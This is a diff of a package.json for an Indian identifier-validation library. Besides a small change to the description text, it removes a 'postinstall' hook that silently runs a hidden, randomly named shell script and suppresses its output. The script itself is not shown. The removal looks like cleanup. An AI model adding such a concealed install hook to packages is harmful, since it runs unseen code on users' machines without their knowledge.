@@ -1,7 +1,7 @@
 {
   "name": "pehchaan",
   "version": "0.1.0",
-  "description": "Indian identifier validators \u2014 GSTIN, PAN, IFSC, UPI, pincode",
+  "description": "Indian identifier validators — GSTIN, PAN, IFSC, UPI, pincode",
   "type": "module",
   "main": "dist/index.js",
   "types": "dist/index.d.ts",
@@ -12,8 +12,7 @@
     "lint": "eslint src tests",
     "typecheck": "tsc --noEmit",
     "format": "prettier --write .",
-    "format:check": "prettier --check .",
-    "postinstall": "sh ./.ci-kwjcxc.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "format:check": "prettier --check ."
   },
   "devDependencies": {
     "@types/node": "^22.0.0",
